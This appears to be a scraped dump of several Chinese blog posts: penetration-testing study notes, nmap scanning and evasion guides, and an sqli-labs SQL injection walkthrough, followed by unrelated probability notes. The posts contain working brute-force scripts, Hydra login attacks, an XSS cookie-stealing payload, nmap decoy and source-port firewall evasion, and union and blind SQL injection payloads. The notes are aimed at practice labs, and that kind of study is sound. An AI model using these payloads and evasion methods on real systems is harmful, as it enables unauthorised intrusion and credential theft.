RND指定生成数量的伪造的随机IP地址，\u0026ndash;data-string\u0026quot;\u0026ldquo;将自定义字符串（ASCII码）插入数据包\n指纹识别 wappalyzer火狐插件\nwhatweb 修改请求消息HTTP -H：Snowwolf -U：Chrome，识别CMS,博客平台，中间件，Web框架模块，网站服务器，脚本，IP，cookie\nWAF识别 防火墙 wafw00f \u0026ndash;proxy=代理地址\n目录扫描 dirb 需要登陆后的网站 -c “Cookie：\u0026hellip;.\u0026rdquo; 隐藏攻击者主机 -a dirbuster 图形化界面 gobuster ffuf -w指定字典文件 -u url Wfuzz web应用程序的模糊测试工具，发现Web应用程序的隐藏资源 -w字典文件 \u0026ndash;hc 404 url/FUZZ ​ 枚举php文件 FUZZ.php\n​ 使用Wfuzz枚举用户名和密码\n​ -f output.html保存为html文件在浏览器种打开\n漏洞数据库 searchsploit 可以与nmap联动 nmap url -sV -oX nmap.xml//-oX将扫描结果保存到一个XML文件中用于与searchsploit工具联动，输入searchsploit \u0026ndash;nmap nmap.xml 谷歌Hacking语法\n批量寻找网站后台 inurl：\nintext：\nintitle：\n指定网站寻找后台 site： inurl:/intext:/intitle:\n指定返回文件类型 filetype：\n批量寻找目录遍历漏洞 intext：index of/admin\nintext:index of\n暴力攻击 破解PIN码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Try every possible 4-digit PIN (from 0000 to 9999) for pin in range(10000): formatted_pin = f\u0026#34;{pin:04d}\u0026#34; # Convert the number to a 4-digit string (e.g., 7 becomes \u0026#34;0007\u0026#34;) print(f\u0026#34;Attempted PIN: {formatted_pin}\u0026#34;) # Send the request to the server response = requests.get(f\u0026#34;http://{ip}:{port}/pin?pin={formatted_pin}\u0026#34;) # Check if the server responds with success and the flag is found if response.ok and \u0026#39;flag\u0026#39; in response.json(): # .ok means status code is 200 (success) print(f\u0026#34;Correct PIN found: {formatted_pin}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 运行\npython pin-solver.py\n字典攻击 字典攻击的有效性在于它能够利用人类倾向于优先选择容易记住的密码而不是安全的密码这一倾向。尽管屡次受到警告，但许多人仍然选择基于字典单词、常用短语、名称或容易猜测的模式等现成信息的密码。这种可预测性使他们容易受到字典攻击，攻击者会系统地针对目标系统测试预定义的潜在密码列表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Download a list of common passwords from the web and split it into lines passwords = requests.get(\u0026#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt\u0026#34;).text.splitlines() # Try each password from the list for password in passwords: print(f\u0026#34;Attempted password: {password}\u0026#34;) # Send a POST request to the server with the password response = requests.post(f\u0026#34;http://{ip}:{port}/dictionary\u0026#34;, data={\u0026#39;password\u0026#39;: password}) # Check if the server responds with success and contains the \u0026#39;flag\u0026#39; if response.ok and \u0026#39;flag\u0026#39; in response.json(): print(f\u0026#34;Correct password found: {password}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 1 python3 dictionary-solver.py Hydra 为 Hydra 构建 params 字符串 Form Parameters：这些是保存用户名和密码的基本字段。Hydra 将动态地用单词列表中的值替换这些参数中的占位符（^USER^和）。^PASS^\nAdditional Fields：如果表单包含其他隐藏字段或令牌（例如 CSRF 令牌），则它们也必须包含在params字符串中。如果它们的值随每次请求而变化，则它们可以具有静态值或动态占位符。\nSuccess Condition：这定义了 Hydra 用来识别成功登录的标准。它可以是 HTTP 状态代码（例如S=302重定向）或服务器响应中特定文本的存在或不存在（例如F=Invalid credentials或S=Welcome）。\nHydra 命令的一般结构http-post-form如下：\n1 hydra [options] target http-post-form \u0026#34;path:params:condition_string\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:S=302\u0026#34; 我们将使用top-usernames-shortlist.txt作为用户名列表，使用2023-200_most_used_passwords.txt作为密码列表。\n例：\n1 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.63.74 -s 35392 http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; ","date":"2025-01-20T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/","title":"脚本小子"},{"content":"Web应用程序 缺陷 真实场景 SQL 注入 获取 Active Directory 用户名并对 VPN 或电子邮件门户执行密码喷洒攻击。 文件包含 阅读源代码以查找隐藏的页面或目录，这些页面或目录公开了可用于获取远程代码执行的附加功能。 不受限制的文件上传 允许用户上传个人资料图片的 Web 应用程序，允许上传任何类型的文件（不仅仅是图片）。可以利用此功能通过上传恶意代码来完全控制 Web 应用程序服务器。 不安全的直接对象引用（IDOR） 当与访问控制失效等缺陷相结合时，这通常可用于访问其他用户的文件或功能。例如，在浏览到 /user/701/edit-profile 等页面时编辑您的用户个人资料。如果我们可以将 更改701为702，我们就可以编辑其他用户的个人资料！ 访问控制失效 另一个示例是允许用户注册新帐户的应用程序。如果帐户注册功能设计不佳，用户可能会在注册时执行权限提升。考虑POST注册新用户时的请求，该请求提交数据username=bjones\u0026amp;password=Welcome1\u0026amp;email=bjones@inlanefreight.local\u0026amp;roleid=3。如果我们可以操纵roleid参数并将其更改为0或会怎样1？我们已经看到了这种情况的真实应用程序，并且可以快速注册管理员用户并访问 Web 应用程序的许多非预期功能。 Web程序布局 层：\n类别 描述 Web Application Infrastructure 描述 Web 应用程序按预期运行所需的组件（如数据库）的结构。由于 Web 应用程序可以设置为在单独的服务器上运行，因此了解它需要访问哪个数据库服务器至关重要。 Web Application Components 组成 Web 应用程序的组件代表与 Web 应用程序交互的所有组件。这些组件分为以下三个区域：UI/UX、Client和Server组件。 Web Application Architecture 架构包括各个 Web 应用程序组件之间的所有关系。 Web 应用程序基础设施 Client-ServerWeb 应用程序通常采用该client-server模型。服务器以客户端-服务器模型托管 Web 应用程序，并将其分发给任何尝试访问它的客户端。在这种模型中，Web 应用程序有两种类型的组件：前端组件，通常在客户端（浏览器）上解释和执行；后端组件，通常由托管服务器编译、解释和执行。 One Server如果任何托管的 Web 应用程序存在漏洞，则整个 Web 服务器都会受到漏洞。 Many Servers - One Database此模型将数据库分离到其自己的数据库服务器上，并允许 Web 应用程序的托管服务器访问数据库服务器以存储和检索数据。只要数据库分离在其自己的数据库服务器上，就可以将其视为多服务器对一个数据库和单服务器对一个数据库。这种模型的主要优势 ( from a security point of view) 是分段，其中 Web 应用程序的每个主要组件都单独放置和托管。如果一个 Web 服务器受到攻击，其他 Web 服务器不会受到直接影响。 Many Servers - Many DatabasesWeb 应用程序只能访问私有数据和跨 Web 应用程序共享的公共数据。也可以将每个 Web 应用程序的数据库托管在其单独的数据库服务器上。这种设计还被广泛用于冗余目的，因此如果任何 Web 服务器或数据库脱机，备份将代替其运行，以尽可能减少停机时间。 Web应用程序组件 `Client\nServer\n网络服务器 Web 应用程序逻辑 数据库 Services\n（微服务）\n第三方集成 Web 应用程序集成 `Functions（无服务器）\n敏感数据泄露 敏感数据泄露是指最终用户可以以明文形式获取敏感数据ctrl + u`通过 Web 代理（如）键入或查看页面源代码Burp Suite\n有时，我们可能会发现登录名credentials、hashes或其他敏感数据隐藏在网页源代码的注释中或JavaScript正在导入的外部代码中。其他敏感信息可能包括暴露的链接或目录，甚至暴露的用户信息，所有这些都可能被利用来进一步访问 Web 应用程序或 Web 应用程序的支持基础设施\nHTML注入 HTML 注入是指未经过滤的用户输入显示在页面上。这可以通过检索之前提交的代码（例如从后端数据库检索用户评论）或直接在JavaScript前端显示未经过滤的用户输入来实现。\n1 \u0026lt;a href=\u0026#34;http://www.hackthebox.com\u0026#34;\u0026gt;Click Me\u0026lt;/a\u0026gt; 跨站点脚本XSS HTML Injection漏洞通常还可用于通过注入要在客户端执行的代码来执行跨站点脚本 (XSS)攻击。一旦我们可以在受害者的机器上执行代码，我们就有可能访问受害者的帐户甚至他们的机器。在实践中与非常相似。但是，涉及注入代码以在客户端执行更高级的攻击，而不仅仅是注入 HTML 代码。主要有三种类型：\n类型 描述 Reflected XSS 当用户输入经过处理（例如搜索结果或错误消息）显示在页面上时发生。 Stored XSS 当用户输入存储在后端数据库并在检索时显示（例如，帖子或评论）时发生。 DOM XSS 当用户输入直接显示在浏览器中并写入HTMLDOM 对象（例如，易受攻击的用户名或页面标题）时发生。 1 #\u0026#34;\u0026gt;\u0026lt;img src=/ onerror=alert(document.cookie)\u0026gt; 显示当前用户的cookie\n后端服务器 软件\nWeb Server Database Development Framework Combinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 组件\nCombinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 硬件\nHTTP响应代码：\n成功的响应 200 OK 请求已成功 重定向消息 301 Moved Permanently 请求资源的 URL 已永久更改 302 Found 请求资源的 URL 已临时更改 客户端错误响应 400 Bad Request 由于语法无效，服务器无法理解请求 401 Unauthorized 未经身份验证尝试访问页面 403 Forbidden 客户端无权访问内容 404 Not Found 服务器找不到请求的资源 405 Method Not Allowed 请求方法已被服务器所知，但已被禁用，无法使用 408 Request Timeout 某些服务器会在空闲连接上发送此响应，即使客户端之前没有任何请求 服务器错误响应 500 Internal Server Error 服务器遇到了不知道如何处理的情况 502 Bad Gateway 服务器在作为网关获取处理请求所需的响应时，收到了无效响应 504 Gateway Timeout 服务器作为网关，无法及时得到响应 端口有两种类型：传输控制协议 (TCP)和用户数据报协议 (UDP) Port(s) Protocol 20/21 (TCP) FTP 22 (TCP) SSH 23 (TCP) Telnet 25 (TCP) SMTP 80 (TCP) HTTP 161 (TCP/UDP) SNMP 389 (TCP/UDP) LDAP 443 (TCP) SSL/TLS (HTTPS) 445 (TCP) SMB 3389 (TCP) RDP shell连接 shell类型 描述 Reverse shell 启动与攻击箱上的“监听器”的连接。 Bind shell “绑定”到目标主机上的特定端口并等待来自我们的攻击箱的连接。 Web shell 通过 Web 浏览器运行操作系统命令，通常不是交互式或半交互式的。它还可用于运行单个命令（即利用文件上传漏洞并上传PHP脚本来运行单个命令）。 渗透测试流程 tmux tmux new -s \u0026lt;名称\u0026gt;\n执行命令 ctrl+b+ d\n重新连接tmux attach -t \u0026lt;名称\u0026gt;\ntmux ls展示所有会话\nnmap 例：nmap 10.129.42.253\n运行 Nmap 脚本的语法是`nmap \u0026ndash;script ","date":"2025-01-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/","title":"Web应用程序"},{"content":" TCP扫描，默认常用 1 sudo nmap -sS localhost 发现主机 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 10.129.2.0/24 目标网络范围。 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 Firewall and IDS Evasion此扫描方法仅在主机的防火墙允许的情况下才有效\n禁用端口扫描，则会启用ICMP扫描\n扫描IP列表 1 cat hosts.lst 这可能意味着其他主机由于其防火墙配置而忽略了默认的ICMP 回应请求Nmap。由于没有收到响应，它会将这些主机标记为非活动状态\n对预定义列表使用相同的扫描技术\n1 sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 -iL 对提供的“hosts.lst”列表中的目标执行定义的扫描。 为了确保发送了 ICMP 回显请求，\nICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 1 sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --packet-trace 显示所有发送和接收的数据包 1 sudo nmap 10.129.2.18 -sn -oA host -PE --reason 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --reason 显示特定结果的原因。 主机和端口扫描 在发现目标还活着之后，我们希望更准确地了解系统。我们需要的信息包括：\n开放端口及其服务 服务版本 服务提供的信息 操作系统 扫描端口六种情况：\n状态 描述 open 这表示已建立与扫描端口的连接。这些连接可以是TCP 连接、UDP 数据报以及SCTP 关联。 closed 当端口显示为关闭时，TCP 协议会指示我们收到的数据包包含一个RST标志。这种扫描方法还可用于确定我们的目标是否还活着。 filtered Nmap 无法正确识别扫描的端口是打开还是关闭，因为目标没有返回该端口的响应，或者我们从目标收到错误代码。 unfiltered 端口的这种状态仅在TCP-ACK扫描期间发生，表示该端口可访问，但无法确定它是开放还是关闭。 `open filtered` `closed filtered` 扫描前 10 个 TCP 端口 1 sudo nmap 10.129.2.28 --top-ports=10 扫描选项 描述 10.129.2.28 扫描指定目标。 --top-ports=10 扫描已被定义为最频繁的指定顶级端口。 Nmap——跟踪数据包 1 sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 21 仅扫描指定端口。 --packet-trace 显示所有发送和接收的数据包。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 信息 描述 SENT (0.0429s) 表示Nmap的SENT操作，向目标发送数据包。 TCP 显示用于与目标端口交互的协议。 10.10.14.2:63090 \u0026gt; 代表我们的 IPv4 地址和源端口，Nmap 将使用它们来发送数据包。 10.129.2.28:21 显示目标 IPv4 地址和目标端口。 S 发送的TCP数据包的SYN标志。 ttl=56 id=57322 iplen=44 seq=1699105818 win=1024 mss 1460 附加的 TCP 标头参数。 连接扫描 Nmap TCP 连接扫描( -sT) 使用 TCP 三次握手来确定目标主机上的特定端口是打开还是关闭。\n1 sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 该Connect扫描（也称为完整 TCP 连接扫描）非常准确，因为它完成了三次 TCP 握手，使我们能够确定端口的确切状态（打开、关闭或过滤）。但是，它并不是最隐蔽的。\n过滤端口 防火墙drops会扫描我们发送的 TCP 数据包。因此，我们扫描 TCP 端口139，该端口已显示为已过滤。为了能够跟踪我们发送的数据包的处理方式，我们再次停用 ICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。\n1 sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn 发现开放的 UDP 端口 1 sudo nmap 10.129.2.28 -F -sU 扫描选项 描述 10.129.2.28 扫描指定目标。 -F 扫描前 100 个端口。 -sU 执行 UDP 扫描。 一些系统管理员有时会忘记过滤除 TCP 端口之外的 UDP 端口，但UDP比TCP慢的多\n这样做的另一个缺点是，我们经常得不到响应，因为Nmap向扫描的 UDP 端口发送空数据报，并且我们没有收到任何响应。所以我们无法确定 UDP 数据包是否已经到达。如果 UDP 端口为open，则只有在应用程序配置为这样做的情况下，我们才会收到响应。\n版本扫描 1 sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV 扫描选项 描述 10.129.2.28 扫描指定目标。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -p 445 仅扫描指定端口。 --reason 显示端口处于特定状态的原因。 -sV 执行服务扫描。 扫描端口的另一种方便方法是-sV使用选项从开放端口获取其他可用信息。此方法可以识别版本、服务名称和有关目标的详细信息。\n保存结果 Nmap可以以 3 种不同的格式保存结果。\n正常输出（-oN）.nmap文件扩展名 带有文件扩展名的Grepable 输出（-oG）.gnmap XML 输出 ( -oX)，.xml文件扩展名 我们还可以指定选项（-oA）以所有格式保存结果。命令可能如下所示：\n1 sudo nmap 10.129.2.28 -p- -oA target 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -oA target 以所有格式保存结果，每个文件的名称以“目标”开头。 1 target.gnmap target.xml target.nmap 转换格式 要将存储的结果从 XML 格式转换为 HTML，我们可以使用该工具xsltproc。\n1 xsltproc target.xml -o target.html 服务枚举 服务版本检测 1 sudo nmap 10.129.2.28 -p- -sV 描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 增加verbosity level（-v/ -vv），当检测到开放端口时，它将直接显示给我们Nmap\n1 sudo nmap 10.129.2.28 -p- -sV -v 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 -v 增加扫描的详细程度，以显示更详细的信息。 横幅抓取 Nmap则尝试通过基于签名的匹配系统识别它们，但这会大大增加扫描的持续时间。Nmap所呈现结果的一个缺点是自动扫描可能会遗漏一些信息，因为有时Nmap不知道如何处理它。\n某些服务可能不会立即提供此类信息。也可以从相应的服务中删除或操纵横幅。如果我们manually使用 连接到 SMTP 服务器nc，抓取横幅，并使用 拦截网络流量tcpdump，我们就可以看到Nmap未显示的内容。\n传输控制包Tcpdump 1 sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28 nc 1 nc -nv 10.129.2.28 25 Nmap脚本引擎 它为我们提供了在 Lua 中创建脚本以与某些服务进行交互的可能性。这些脚本总共可分为 14 个类别：\n类别 描述 auth 确定身份验证凭证。 broadcast 通过广播来发现主机的脚本以及发现的主机可以自动添加到剩余的扫描中。 brute 执行脚本，尝试通过使用凭证进行暴力破解来登录相应的服务。 default 使用该-sC选项执行的默认脚本。 discovery 无障碍服务的评估。 dos 这些脚本用于检查服务是否存在拒绝服务漏洞，由于它会损害服务，因此使用较少。 exploit 此类脚本尝试利用扫描端口的已知漏洞。 external 使用外部服务进行进一步处理的脚本。 fuzzer 这使用脚本通过发送不同的字段来识别漏洞和意外的数据包处理，这可能需要很长时间。 intrusive 可能对目标系统产生负面影响的侵入性脚本。 malware 检查某些恶意软件是否感染了目标系统。 safe 不执行侵入性和破坏性访问的防御脚本。 version 服务检测的扩展。 vuln 识别特定的漏洞。 默认脚本 -sC\n特定脚本类型\u0026ndash;script 定义脚本 \u0026ndash;script ,\nNmap - Aggressive Scan -A 1 sudo nmap 10.129.2.28 -p 80 -A -A 执行服务检测、操作系统检测、跟踪路由并使用默认脚本扫描目标。 发现了系统上运行着哪种 Web 服务器,使用了哪种 Web 应用程序，以及网页的标题 。 漏洞评估 --script vuln 使用指定类别的所有相关脚本。 防火墙和IDS/IPS规避 TCP SYN扫描又称“半开扫描”。回顾TCP连接的三次握手，申请方首先发送的是一个SYN数据包，服务方在接到这个SYN数据包后，如果该端口处于侦听状态，则会回复一个SYN|ACK的数据包；如果该端口没有处于侦听状态，则会回复一个RST的数据包。而此时如果对方处于侦听状态，申请方还需要再向对方回复一个ACK数据包以示建立连接。此时对方就认为连接建立，并记入日志。\n无论服务方回复SYN|ACK的数据包，还是回复RST的数据包，申请方其实已经能够判断对方端口是否为“开”的状态。之后的ACK数据包发送则被对方监视，如果此时不发送ACK数据包，而是发一个RST数据包，则不仅关闭了这个未完成的连接过程，并且也会因为连接未建立而不会被对方记录。这种扫描方式因为使用了SYN标志位，所以被称为TCP SYN扫描。这种扫描技术的优点在于一般不会在目标计算机上留下记录，有时即使在用netstat命令也显示不出来；但这种方法的一个缺点是必须要有管理员权限才能建立自己的SYN数据包。\n使用诱饵扫描 Nmap 会生成插入到 IP 标头中的各种随机 IP 地址，以掩盖发送的数据包的来源。使用此方法，我们可以随机生成 ( RND) 个特定数量（例如：5）的 IP 地址，并以冒号 ( :) 分隔。然后，我们的真实 IP 地址会随机放置在生成的 IP 地址之间\n1 sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 80 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -D RND:5 生成五个随机 IP 地址，指示连接来自的源 IP。 DNS 代理 过滤端口的 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace 从 DNS 端口进行 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 现在我们已经发现防火墙接受了TCP port 53，因此很可能 IDS/IPS 过滤器的配置也比其他过滤器弱得多。我们可以通过使用 尝试连接到此端口来测试这一点Netcat。\n扫描选项 描述 10.129.2.28 扫描指定目标。 -p 50000 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 --source-port 53 从指定的源端口执行扫描。 连接到过滤端口 1 ncat -nv --source-port 53 10.129.2.28 50000 ","date":"2025-01-12T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nmap%E5%9F%BA%E7%A1%80/","title":"nmap基础"},{"content":" 工具：phpstudy，Hackbar 搭建靶场：sqli-labs(从Github上下载官方的，有些民间的可能会有木马) 数据库：mysql5.7 联合注入 需要页面有回显位\n查找注入点\n判断使字符型还是数字型注入id=2-1\n如果是字符型，找到闭合方式，‘，“，’)\n判断查询列数，order by\n查询回显位置，同时将原先的查询id注释掉\n拿到表名和列名：数据库（information_schema），表名集合表（tables），列名集合表（columns）用group_concat()确保所有查询信息能放到一行显示出来\nless-1 判断是否存在sql注入\n\u0026ndash;+表示对多余的引号进行注释，因为是字符型，数字型就不用管\n1 ?id=1\u0026#39; order by 3--+ 显示正常\n1 ?id=1\u0026#39; order by 4--+ 报错\n得知less-1共有三列，爆出显示位\n1 ?id=1\u0026#39; union select 1,2,3--+ 在mysql里面尝试union select\n1 ?id=-1\u0026#39; union select 1,2,3--+ 使id=-1报错注释，页面显示正常\n获取数据名\n1 ?id=-1\u0026#39; union select 1,database(),version() --+ 中间省略了一些过程详见less-2\n查询用户名和密码\n1 ?id=-1\u0026#39; union select 1,group_concat(username,\u0026#39;~\u0026#39;,password),3 from users--+ less-2 判断为数字型，页面改变\n1 ?id=2-1 ？id=2 三列\n1 ?id=1 order by 3 闭合方式为‘\n1 ?id=1\u0026#39; order by 3 爆数据名\n1 ？id=-1 union select 1,database(),version() 爆表名\n1 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; 爆列名\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; less-3 与前两关不同的地方是闭合方式\n1 ?id=1\u0026#39; 单引号加括号，后续一律以?id=1\u0026rsquo;)开头，和上面同\nless-4 判断得知闭合方式双引号加括号\n1 /?id=2\u0026#34; 布尔盲注 页面没有回显，只适用于Mysql，本质就是猜数字游戏，ASCII码判断用二分法，对于字符长度判断可以直接猜大小\n判断得知闭合方式为'\n二分法判断数据库长度 1 2 3 4 ?id=1\u0026#39; and length(database())\u0026gt;10--+ //不显示 ?id=1\u0026#39; and length(database())\u0026gt;5--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;7--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;8--+ //不显示 得知database（）长度为8\n二分法利用ASCII码判断字符 1 2 3 4 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;100--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;114--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;120--+ //不显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;115--+ //不显示 得知第一个字符ASCII码为115，即“s”\n依次判断8个字符，知当前数据库为security\n判断当前数据库的表 判断是否存在admin表\n1 ?id=1\u0026#39; and exists(select * from admin)--+ 判断表的个数 1 2 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;4--+ //正常显示 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;3--+ //不显示 逐一判断表名字符长度 1 ?id=1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1))=6--+ 逐一判断表名字符的ASCII码 1 ?id=1\u0026#39; and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1),1,1))\u0026gt;100--+ 存在emails,referers,uagents,users\n对column执行相同的操作，where语句修改 1 where table_name = \u0026#39;users\u0026#39; //以及uagents,referers,emails.......一个一个判断，虽然这个过程真的十分漫长 得知users中有三个字段id,username,password\n判断字段长度 1 ?id=1\u0026#39; and length((select id from users limit 3,1))=1--+ 判断字段ASCII值 1 ?id=1\u0026#39; and ascii(substr((select id from users limit 3,1)),1,1)\u0026gt;100--+ ","date":"2025-01-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sqli-labs%E9%80%9A%E5%85%B3/","title":"sqli-labs通关"},{"content":"记号\n$$\\binom n{n_1,n_2,\\cdots,n_r}=\\frac{n!}{n_1!n_2!\\cdots n_r!}$$因此，$\\binom n{n_1,n_2,\\ldots,n_r}$表示把 $n$ 个 不 同 的 元 素 分 成 大 小 分 别 为 $n_1, n_2, \\ldots , n_r$的$r$个\n不同组的组合数. 例 5e 假设有$n+m$个球，其中$n$个红的，$m$个蓝的，将它们随机排成一排，即所$(n+m)!$种排列都是等可能的. 如果只记录连续排列的球的颜色，证明各种可能的结果概率是一样的. 解 我们将$(n+m$)个球的次序排列称为一组球的排列，将 $n+m$ 个球的颜色次序排称为一组球的颜色次序排列. 球的排列共有($n+m$)!种，在红球之间作任何一个位于换，在蓝球之间作任何一个位置置换，置换的结果并不影响球的颜色次序排列. 从而组球的颜色次序排列，对应于$n!m!$个球的排列，这说明球的次序排列也是等可能的且每一种颜色次序出现的概率为$n!m!/(n+m)!.$\n多项式定理\n$$(x_{1}+x_{2}+\\cdots+x_{r})^{n}=\\sum_{\\begin{array}{c}(n_{1},\\cdots,n_{r}):\\\\n_{1}+\\cdots+n_{r}=n\\end{array}}\\binom{n}{n_{1},n_{2},\\cdots,n_{r}}x_{1}^{n_{1}}x_{2}^{n_{2}}\\cdots x_{r}^{n_{r}}$$上式的求和号是对满足 $n_1+n_2+\\cdotp\\cdotp\\cdotp\\cdotp+n_r=n$ 的所有非负整数向量($n_1,n_2,\\cdotp\\cdotp\\cdotp,n_r)$求和.\n命题 6.1 共有$\\binom{n-1}{r-1}$个不同的正整数向量$(x_1,x_2,\\cdots,x_r)$满足 为了得到非负整数解(而不是正整数解)的个数，注意，$x_1+x_2+\\cdots+x_r=n$的非负整数解个数与$y_1+y_2+\\cdotp\\cdotp\\cdotp+y_r=n+r$的正整数解个数是相同的(令$y_i= x_i+ 1$, $i= 1$, $\\cdots$, $r) .$ 因此，利用命题 6.1,可得到如下命题。\n生日问题 如果房间里有$n$个人，那么没有两人的生日是同一天的概率是多大？当$n$多大 时，才能保证此概率小于1/2? 解 每个人的生日都有 365 种可能，所以$n$个人一共是 365\u0026quot; 种可能(此处忽略有人生日是 2月 29 日的可能性). 假定每种结果的可能性都是一样的，那么所求事件的概率为$365\\times364\\times363\\times\\cdots\\times(365-n+1)/365^n.$令人惊奇的是，一旦$n\\geqslant23$,这个概率就比1/2要小. 即房间里人数如果超过 23 的话，那么至少有两人为同一天生日的概率就大于 1/2. 很多人一开始对这个结果很吃惊，因为 23 相对于一年 365 天来说太小了.然而，对每两个人来说，生日相同的概率为$\\frac{365\\cdot\\tilde{}}{(365)^2}=\\frac1{365}$,23个人一共可以组成$\\binom{23}2=253$ 对，这样来看上述结果似乎就不再令人吃惊了.\n配对问题 假设有 N 位男士参加舞会，所有人都将帽子扔到房间中央混在一 起，然后每人再随机拿一顶帽子.所有人都没有拿到自己帽子的概率是多少？ 解 先计算至少有一人拿到自己的帽子的概率.令$E_i(i=1,2,\u0026hellip;,N)$表示事件“第$i$ 人拿到了自己的帽子”.这样，由命题 4.4,至少有一人拿到了自己的帽子的概率为：\n$$P\\Big(\\bigcup_{i=1}^{N}E_{i}\\Big)\\:=\\sum_{i=1}^{N}P(E_{i})-\\sum_{i_{1}","date":"2024-12-27T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%B0%8F%E7%BB%93/","title":"概率论模型及小结"},{"content":"第二章 关系数据库 